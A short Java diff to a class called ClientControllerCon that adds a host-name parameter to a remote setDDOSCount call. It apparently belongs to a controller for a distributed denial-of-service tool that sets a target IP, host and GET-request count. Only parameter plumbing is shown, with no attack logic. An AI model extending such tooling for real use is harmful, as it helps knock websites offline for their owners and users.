@@ -19,6 +19,7 @@ public class ClientControllerCon {
     
     private static int myGETCount=0;
     private static String myIP="";
+    private static String hostName="";
    
     
     public static boolean start(){
@@ -50,8 +51,8 @@ public class ClientControllerCon {
         
         System.out.println(remoteObject.getResponse("hi"));
         
-        if(myGETCount!=0 && !myIP.equals(""))
-            remoteObject.setDDOSCount(myGETCount,myIP);
+        if(myGETCount!=0 && !myIP.equals("") && !hostName.equals(""))
+            remoteObject.setDDOSCount(myGETCount,myIP,hostName);
         
          
         
@@ -64,9 +65,10 @@ public class ClientControllerCon {
        
        
        
-       public static void setControllerVar(int count, String ip){
+       public static void setControllerVar(int count, String ip, String HName){
        myGETCount=count;
        myIP=ip;
+       hostName=HName;
        }
     
     
